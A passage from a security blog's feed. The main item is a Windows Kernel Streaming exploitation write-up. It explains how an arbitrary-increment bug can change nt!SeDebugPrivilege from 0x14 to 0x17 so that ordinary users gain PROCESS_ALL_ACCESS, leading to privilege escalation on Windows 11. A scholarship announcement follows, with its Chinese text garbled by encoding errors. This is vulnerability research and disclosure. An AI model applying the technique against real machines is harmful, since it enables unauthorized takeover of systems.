&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When triggered, ks will increment the content at our provided memory address. Therefore, we have a kernel arbitrary increment primitive here.&lt;/p&gt;

&lt;h3 id=&quot;arbitrary-increment-primitive-to-eop&quot;&gt;Arbitrary increment primitive to EoP&lt;/h3&gt;
&lt;p&gt;From arbitrary increment primitive to EoP, there are many methods that can be exploited, among which the most well-known are &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abuse token privilege&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing&lt;/code&gt;&lt;/a&gt;. Initially, it seemed like this would be the end of it.&lt;/p&gt;

&lt;p&gt;However, both of these methods have certain limitations in this situation:&lt;/p&gt;

&lt;h4 id=&quot;abuse-token-privilege&quot;&gt;Abuse token Privilege&lt;/h4&gt;
&lt;p&gt;If we use the method of abusing token privilege for EoP, the key lies of the technique in overwriting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Enable&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Present&lt;/code&gt;. Since our vulnerability can only be incremented by one at a time, both fields need to be written to obtain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;. The default values for these two fields are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x602880000&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000&lt;/code&gt;, which need to be changed to 0x602&lt;strong&gt;9&lt;/strong&gt;80000 and 0x&lt;strong&gt;9&lt;/strong&gt;00000. This means each field needs to be written 0x10 times, totaling 0x20 writes. Each write requires a race condition, which takes times and significantly reduces stability.&lt;/p&gt;

&lt;h4 id=&quot;ioring&quot;&gt;IoRing&lt;/h4&gt;
&lt;p&gt;Using IoRing to achieve arbitrary writing might be a simpler method. To achieve arbitrary write, you just need to overwriteÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffersCount&lt;/code&gt;Â andÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffers&lt;/code&gt;. However, a problem arises.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When triggering the arbitrary increment, if the original value is 0, it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsQueueWorkItem&lt;/code&gt;, where some corresponding complex processing will occur, leading to BSoD. The exploitation method of IoRing happens to encounter this situationâ€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Is it really impossible to exploit it stably?&lt;/p&gt;

&lt;h4 id=&quot;lets-find-a-new-way-&quot;&gt;Letâ€™s find a new way !&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;When traditional exploitation methods hit a roadblock, it might be worthwhile to dive deeper into the core mechanics of the technique. You may unexpectedly discover new approaches along the way.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After several days of contemplation, we decided to seek a new approach. However, starting from scratch might take considerable time and may not yield results. Therefore, we chose to derive new inspiration from two existing methods. First, letâ€™s look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abusing token privilege&lt;/code&gt;. The key aspect here is exploiting a vulnerability to obtain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;, allowing us to open high-privilege processes such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winlogon&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The question arises: why does having &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt; allow you to open high-privilege processes?&lt;/p&gt;

&lt;p&gt;We need to take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!PsOpenProcess&lt;/code&gt; first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From this code snippet, we can see that when we open the process, the kernel will use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-sesingleprivilegecheck&quot;&gt;SeSinglePrivilegeCheck&lt;/a&gt; to check if you have SeDebugPrivilege. If you have it, you will be granted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt; permission, allowing you to perform any action on any process except PPL. As the name implies, it is intended for debugging purposes. However, it is worth noting that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; is a global variable in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Itâ€™s a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-luid&quot;&gt;LUID&lt;/a&gt; structure that was initialized at system startup. The actual value is 0x14, indicating which bit in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Enable&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Present&lt;/code&gt; fields represent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;. Therefore, when we use NtOpenProcess, the system reads the value in this global variable&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; is obtained, it will be used to inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges&lt;/code&gt; field in the Token to see if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Present&lt;/code&gt; fields are set. For &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;, it will check the 0x14 bit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, there is an interesting thingâ€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The global variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; is located in a writable section!&lt;/p&gt;

&lt;p&gt;A new idea was born.&lt;/p&gt;

&lt;h4 id=&quot;make-abusing-token-privilege-great-again-&quot;&gt;Make abusing token privilege great again !&lt;/h4&gt;
&lt;p&gt;By default, a normal user will have only a limited number of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges&lt;/code&gt;, as shown in this diagram.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can notice that in most cases, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt; is enabled. At this point, we can look at the initialization part and find that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt; represents the value 0x17.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What would happen if we use the vulnerability to change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; from 0x14 to 0x17?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure, in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtOpenProcess&lt;/code&gt; flow, it will first get the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt;, and at this time the obtained value is 0x17 (SeChangeNotifyPrivilege)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next check will verify the current process token using 0x17 to see if it has this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privilege&lt;/code&gt;. However, normal users generally have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt;, so even if you donâ€™t have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;, you will still pass the check and obtain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt;. In other words, anyone with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt; can open a high-privilege process except PPL.&lt;/p&gt;

&lt;p&gt;Furthermore, by using the vulnerability mentioned above, we can change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; from &lt;strong&gt;0x14 to 0x17&lt;/strong&gt;. Since the original value is not 0, it will not be affected by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsQueueWorkItem&lt;/code&gt;, making it highly suitable for our purposes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we can open a high-privilege process, the privilege escalation method is the same as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abuse token privilege&lt;/code&gt; approach so that we wonâ€™t elaborate on that here. Ultimately, we successfully achieved EoP on Windows 11 23H2 by again utilizing Proxying to kernel.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/m2TNVDgz7CI?si=YJQ9_u7xoyVt1wRm&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;remark&quot;&gt;Remark&lt;/h4&gt;
&lt;p&gt;Actually, this technique also applies to other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privilege&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;SeTcbPrivilege = 0x7&lt;/li&gt;
  &lt;li&gt;SeTakeOwnershipPrivilege = 0x9&lt;/li&gt;
  &lt;li&gt;SeLoadDriverPrivilege = 0xa&lt;/li&gt;
  &lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;the-next--summary&quot;&gt;The Next &amp;amp; Summary&lt;/h2&gt;

&lt;p&gt;The focus of these two articles is primarily on how we analyze past vulnerabilities to discover new ones, how we gain new ideas from previous research, find new exploitation methods, new vulnerabilities, and new attack surfaces.&lt;/p&gt;

&lt;p&gt;There may still be many security issues of this bug class, and they might not be limited to Kernel Streaming and &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt;. I believe this is a design flaw in Windows, and if we search carefully, we might find more vulnerabilities.&lt;/p&gt;

&lt;p&gt;For this type of vulnerability, you need to pay attention to the timing of setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt;. If it is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; and then user input is used, issues may arise. Moreover, this type of vulnerability is often very exploitable.&lt;/p&gt;

&lt;p&gt;In Kernel Streaming, I believe there are quite a few potential security vulnerabilities. There are also many components like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hdaudio.sys&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Usbvideo.sys&lt;/code&gt; that might be worth examining and are suitable places for fuzzing. If you are a kernel driver developer, it is best not to only check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; . There might still be issues within the Windows architecture. Finally, I strongly recommend everyone to update Windows to the latest version as soon as possible.&lt;/p&gt;

&lt;h2 id=&quot;is-that-the-end-of-it-&quot;&gt;Is that the end of it ?&lt;/h2&gt;
&lt;p&gt;Apart from proxy-based vulnerabilities, we have also identified many other bug classes, allowing us to discover over 20 vulnerabilities in Kernel Streaming. Some of these vulnerabilities are quite unique, so stay tuned for Part III.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Easy Local Windows Kernel Exploitation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/</link>
                <guid>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en</guid>
                <pubDate>Sat, 05 Oct 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2024 å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆç•«å³æ—¥èµ·é–‹æ”¾å ±å</title>
                <description>&lt;p&gt;ç¹¼è¼”ä»å¤§å­¸åŠåœ‹ç«‹è‡ºç£ç§‘æŠ€å¤§å­¸æˆ´å¤«å¯‡çˆ¾è³‡è¨Šå®‰å…¨çå­¸é‡‘é ’å¸ƒå¾Œï¼Œæˆ‘å€‘å¾ˆé«˜èˆˆåœ°å®£ä½ˆï¼Œ2024 å¹´åº¦ã€Œå…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€åŠã€Œè³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆç•«ã€æ–¼å³æ—¥èµ·é–‹æ”¾å ±åã€‚&lt;/p&gt;

&lt;p&gt;è‡ª 2012 å¹´å‰µç«‹ä¹‹åˆï¼ŒDEVCORE å³ç§‰æŒè‘—æå‡å°ç£è³‡å®‰ç«¶çˆ­åŠ›ã€è®“ä¸–ç•Œæ›´å®‰å…¨çš„åˆè¡·ï¼Œå°‡äººæ‰åŸ¹è‚²è¦–ç‚ºå·±ä»»ï¼Œé€éåƒèˆ‡æ•™è‚²éƒ¨è³‡å®‰äººæ‰åŸ¹è‚²è¨ˆç•«ã€å‰µè¾¦ DEVCORE å¯¦ç¿’ç”Ÿè¨ˆç•«ã€å•Ÿå‹•æˆ´å¤«å¯‡çˆ¾è³‡å®‰çå­¸é‡‘ã€è¾¦ç†è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆç•«ç­‰æ–¹å¼ï¼Œå”åŠ©è³‡å®‰äººæ‰èŒå£¯æˆé•·ã€‚&lt;/p&gt;

&lt;h3 id=&quot;devcore-å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘&quot;&gt;DEVCORE å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘&lt;/h3&gt;

&lt;p&gt;DEVCORE æ–¼ 2020 å¹´é¦–æ¬¡èˆ‰è¾¦ã€Œæˆ´å¤«å¯‡çˆ¾è³‡å®‰çå­¸é‡‘è¨ˆç•«ã€ï¼ŒåŸç‚ºæ„Ÿå¿µéå»å­¸ç”Ÿæ™‚ä»£å—åˆ°çš„å¤šæ–¹è³‡æºåŠé¼“å‹µï¼Œçå­¸é‡‘é ’ç™¼ç¯„åœç‚ºç¶“ç‡Ÿåœ˜éšŠæ¯æ ¡çš„è¼”ä»å¤§å­¸åŠåœ‹ç«‹è‡ºç£ç§‘æŠ€å¤§å­¸ï¼Œå¾Œç‚ºåŸ¹è‚²æ›´å¤šæœ‰å¿—é’å¹´å­¸å­ï¼Œæ“´å¤§çå­¸é‡‘ç¯„åœï¼Œé–‹æ”¾å…¨åœ‹å„åœ°å­¸ç”Ÿå ±åç”³è«‹ï¼ŒæœŸå¾…èƒ½æ¨å»£ã€Œé§­å®¢æ€ç¶­ã€ã€å¼·åŒ–è³‡å®‰æŠ€èƒ½ï¼Œä¸¦å¹«åŠ©åœ¨å­¸å­¸ç”Ÿäº†è§£è³‡å®‰ç”¢æ¥­ç”Ÿæ…‹åŠç¾æ³ã€é™ä½å­¸ç”¨è½å·®ï¼Œæœªä¾†æˆç‚ºæ–°ä¸€ä»£çš„æ”»æ“Šå‹è³‡å®‰äººæ‰ï¼Œç‚ºè³‡å®‰ç”¢æ¥­æ³¨å…¥æ–°æ´»åŠ›ã€‚&lt;/p&gt;

&lt;p&gt;ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€æ­¡è¿æ‰€æœ‰åœ¨è³‡è¨Šå®‰å…¨é ˜åŸŸæœ‰å‡ºçœ¾ç ”ç©¶æˆæœçš„å­¸ç”Ÿå ±åç”³è«‹ï¼Œæœ‰æ„ç”³è«‹è€…é ˆæå‡ºå­¸ç¿’è³‡å®‰çš„å‹•æ©Ÿèˆ‡æ­·ç¨‹ï¼Œä¸¦ç¹³äº¤è³‡å®‰ç ”ç©¶æˆ–æ¯”è³½æˆæœï¼Œæˆ‘å€‘å°‡å¾ä¸­æ“‡å„ªé¸å– 10 åï¼Œç²é¸è€…å¯ç²æœ€é«˜ 2 è¬å…ƒçš„ç ”ç©¶è£œåŠ©ã€‚è©³ç´°ç”³è«‹è¾¦æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç”³è«‹è³‡æ ¼ï¼šå…¨åœ‹å„å¤§å°ˆé™¢æ ¡å­¸ç”Ÿçš†å¯ä»¥ç”³è«‹ã€‚&lt;/li&gt;
  &lt;li&gt;çå­¸é‡‘é‡‘é¡/åé¡ï¼šæ¯å¹´åº¦å– 10 åï¼Œæ¯åå¯ç²å¾—çå­¸é‡‘æ–°å°å¹£ 20,000 å…ƒæ•´ï¼Œå…±è¨ˆ 20 è¬å…ƒã€‚å¦‚å ±åè¸´èºï¼Œæˆ‘å€‘å°‡è¦–ç”³è«‹ç‹€æ³å¢åŠ åé¡ã€‚&lt;/li&gt;
  &lt;li&gt;ç”³è«‹æ™‚ç¨‹ï¼š
    &lt;ul&gt;
      &lt;li&gt;2024/9/6 å®˜ç¶²å…¬å‘Šçå­¸é‡‘è¨ˆç•«è³‡è¨Š&lt;/li&gt;
      &lt;li&gt;2024/9/6 - 2024/10/3 é–‹æ”¾æ”¶ä»¶&lt;/li&gt;
      &lt;li&gt;2024/10/31 å…¬å¸ƒå¯©æŸ¥çµæœï¼Œä¸¦å°‡æ–¼ 11 è‡³ 12 æœˆé–“é ’ç™¼çå­¸é‡‘&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç”³è«‹è¾¦æ³•ï¼š
    &lt;ul&gt;
      &lt;li&gt;è«‹ä¾â½‚ä»¶æª¢æ ¸è¡¨é …æ¬¡é †åºæ’åˆ—å·²é™„â½‚ä»¶ï¼Œå½™æ•´ç‚ºâ¼€ä»½ PDF æª”æ¡ˆï¼Œå¯„â¾„ &lt;a href=&quot;mailto:scholarship@devco.re&quot;&gt;scholarship@devco.re&lt;/a&gt;ã€‚&lt;/li&gt;
      &lt;li&gt;ä¿¡ä»¶ä¸»æ—¨åŠ PDF æª”æ¡ˆåç¨±è«‹ç¬¦åˆä»¥ä¸‹æ ¼å¼ï¼š[å…¨åœ‹çå­¸â¾¦ç”³è«‹] å­¸æ ¡åç¨±_å­¸è™Ÿ_å§“åï¼ˆç¯„ä¾‹ï¼š[å…¨åœ‹çå­¸â¾¦ç”³è«‹] è¼”ä»â¼¤å­¸_B11100000_ç‹â¼©ç¾ï¼‰ã€‚&lt;/li&gt;
      &lt;li&gt;è«‹ç”³è«‹â¼ˆâ¾ƒæˆ‘æª¢æ ¸ä¸¦æ–¼ç”³è«‹â¼ˆæª¢æ ¸å€å‹¾é¸å·²é™„â½‚ä»¶ï¼Œè‹¥â½‚ä»¶ä¸â¿‘æˆ–æœªç¢ºå¯¦å‹¾é¸æ•ä¸å—ç†ç”³è«‹ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é ˆæª¢é™„æ–‡ä»¶ï¼š
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;/assets/files/scholarship/æˆ´å¤«å¯‡çˆ¾å…¨åœ‹çå­¸é‡‘ç”³è«‹è¡¨.pdf&quot;&gt;æœ¬çå­¸â¾¦ç”³è«‹è¡¨&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;åœ¨å­¸è­‰æ˜&lt;/li&gt;
      &lt;li&gt;æœ€è¿‘â¼€å­¸æœŸæˆç¸¾å–®&lt;/li&gt;
      &lt;li&gt;å­¸ç¿’è³‡è¨Šå®‰å…¨ä¹‹å‹•æ©Ÿèˆ‡æ­·ç¨‹â¼¼å¾—â¼€ç¯‡ï¼šå­—æ•¸ 500 - 2000 å­—&lt;/li&gt;
      &lt;li&gt;è³‡è¨Šå®‰å…¨æŠ€è¡“ç›¸é—œç ”ç©¶æˆæœï¼šè‡³å°‘é ˆå¾ä»¥ä¸‹å…­é …ç›®ä¸­æ“‡ä¸€ç¹³äº¤ï¼ŒåŒ…å«ç ”è¨æœƒæŠ•ç¨¿ã€æ¼æ´çå‹µè¨ˆç•«ã€å¼±é»ç ”ç©¶ã€è³‡è¨Šå®‰å…¨æ¯”è³½ã€è³‡å®‰å·¥å…·ç ”ç©¶ã€æŠ€è¡“æ–‡ç« ç™¼è¡¨ç­‰æˆæœ&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤ç¶“ç‡Ÿæˆæœï¼šè‡³å°‘é ˆå¾ä»¥ä¸‹å…©é …ç›®ä¸­æ“‡ä¸€ç¹³äº¤ï¼ŒåŒ…å«æ ¡åœ’è³‡å®‰ç¤¾åœ˜ã€å…¬é–‹è³‡å®‰ç¤¾ç¾¤ç­‰&lt;/li&gt;
      &lt;li&gt;æ¨è–¦å‡½ï¼šå°å¸«ã€ç³»ä¸»ä»»ã€å…¶ä»–æ•™æˆæˆ–æ¥­ç•Œâ¼ˆâ¼ æ¨è–¦å‡½ï¼Œâ¾„å°‘é ˆå–å¾—å…©å°ä»¥ä¸Šæ¨è–¦å‡½&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;devcore-è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆåŠƒ&quot;&gt;DEVCORE è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆåŠƒ&lt;/h3&gt;

&lt;p&gt;ä»Šå¹´æˆ‘å€‘ä¹Ÿå°‡æŒçºŒè´ŠåŠ©è³‡å®‰æ•™è‚²æ´»å‹•ï¼Œæä¾›ç¶“è²»äºˆè³‡å®‰ç›¸é—œä¹‹ç¤¾ç¾¤ã€ç¤¾åœ˜è¾¦ç†å„é …æ´»å‹•ï¼Œå‡èšå°ç£è³‡å®‰ç¤¾ç¾¤ï¼ŒåŠ é€ŸåŸ¹è‚²å°ç£çš„è³‡å®‰æ–°éŠ³ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç”³è«‹è³‡æ ¼ï¼šèˆ‡è³‡å®‰è­°é¡Œç›¸é—œä¹‹ç¤¾ç¾¤ã€ç¤¾åœ˜æ´»å‹•ï¼Œè«‹ç”± 1 ä½ç¤¾åœ˜ä»£è¡¨äººå¡«å¯«è³‡æ–™ã€‚&lt;/li&gt;
  &lt;li&gt;è´ŠåŠ©é‡‘é¡ï¼šä¾å„ç¤¾åœ˜æ´»å‹•éœ€æ±‚åŠèˆ‡ DEVCORE åœ˜éšŠè¨è«–è€Œå®šï¼Œæ¯æ¬¡æœ€é«˜è£œåŠ©é‡‘é¡ç‚ºæ–°å°å¹£ 20,000 å…ƒæ•´ã€‚&lt;/li&gt;
  &lt;li&gt;ç”³è«‹æ™‚ç¨‹ï¼šå¦‚æ¬²ç”³è«‹æ­¤è¨ˆç•«çš„ç¤¾åœ˜æˆ–æ´»å‹•ï¼Œè«‹æ–¼ 2024/10/31 å‰é€éä»¥ä¸‹é€£çµå¡«å¯«åˆæ­¥è³‡æ–™ï¼Œæˆ‘å€‘å°‡æ–¼ 30 æ—¥å…§é€šçŸ¥ç¬¦åˆç”³è«‹è³‡æ ¼è€…æä¾›é€²ä¸€æ­¥è³‡æ–™ï¼Œä¸ç¬¦åˆè³‡æ ¼è€…å°‡ä¸å¦è¡Œé€šçŸ¥ã€‚&lt;/li&gt;
  &lt;li&gt;ç”³è«‹é€£çµï¼š&lt;a href=&quot;https://forms.gle/dW3GcGjw5z8WQ9pV9&quot; target=&quot;_blank&quot;&gt;DEVCORE 2024 å¹´è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©èª¿æŸ¥&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;é ˆæä¾›è³‡æ–™ï¼š
    &lt;ul&gt;
      &lt;li&gt;ç”³è«‹è³‡æ ¼ï¼šç”³è«‹äººéœ€ä»¥å„è³‡å®‰ç¤¾ç¾¤æˆ–ç¤¾åœ˜åç¾©æå‡ºç”³è«‹ã€‚&lt;/li&gt;
      &lt;li&gt;è¯çµ¡é›»å­éƒµä»¶&lt;/li&gt;
      &lt;li&gt;æƒ³è¦è¾¦ç†çš„æ´»å‹•é¡å‹&lt;/li&gt;
      &lt;li&gt;æƒ³è¦è¾¦ç†çš„æ´»å‹•æ–¹å¼&lt;/li&gt;
      &lt;li&gt;æ´»å‹•ç¸½é ç®—&lt;/li&gt;
      &lt;li&gt;é è¨ˆéœ€è¦è´ŠåŠ©é‡‘é¡&lt;/li&gt;
      &lt;li&gt;ä»£è¡¨äººå§“åã€é€£çµ¡é›»è©±&lt;/li&gt;
      &lt;li&gt;åœ˜é«”åç¨±&lt;/li&gt;
      &lt;li&gt;åœ˜é«”å–®ä½ç¶²å€&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æ³¨æ„äº‹é …ï¼š
    &lt;ul&gt;
      &lt;li&gt;ç”³è«‹æ¡ˆå¯©æ ¸å°‡ç¶“é DEVCORE å…§éƒ¨å¯©æ ¸æ©Ÿåˆ¶ï¼Œä¸¦ä¿æœ‰æœ€çµ‚æ ¸æ±ºæ¬Šã€‚&lt;/li&gt;
      &lt;li&gt;æœ¬å•å·åƒ…ä¾›åˆæ­¥æ„é¡˜è’é›†ç”¨é€”ï¼Œç¬¦åˆç”³è«‹è³‡æ ¼è€…ï¼ŒDEVCORE å°‡æ–¼ 30 æ—¥å…§é€šçŸ¥æä¾›é€²ä¸€æ­¥è³‡æ–™ä¾›å¯©æ ¸ï¼Œå…¶é¤˜å°‡ä¸å¦è¡Œé€šçŸ¥ã€‚&lt;/li&gt;
      &lt;li&gt;DEVCORE ä¿æœ‰ä¿®æ”¹ã€æš«åœæˆ–çµ‚æ­¢æœ¬è´ŠåŠ©è¨ˆç•«ä¹‹æ¬Šåˆ©ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/09/06/2024-devcore-cybersecurity-scholarship-application-opens/</link>
                <guid>https://devco.re/blog/2024/09/06/2024-devcore-cybersecurity-scholarship-application-opens</guid>
                <pubDate>Fri, 06 Sep 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I</title>
